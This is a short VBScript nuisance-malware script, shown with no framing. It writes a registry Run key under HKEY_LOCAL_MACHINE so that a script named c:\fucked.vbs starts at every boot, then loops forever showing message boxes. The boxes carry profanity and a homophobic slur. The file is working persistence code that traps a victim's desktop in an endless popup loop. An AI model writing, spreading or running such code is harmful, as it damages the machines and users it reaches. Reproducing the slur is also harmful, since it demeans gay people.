Dim fuck, dirr
Set fuck = CreateObject("Scripting.FileSystemObject")
On Error Resume Next
Set dirr = fuck.GetSpecialFolder(1)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\explorer","wscript c:\fucked.vbs"
do
msgbox "Owned"
msgbox "Fuck you"
msgbox "faggot" 
loop
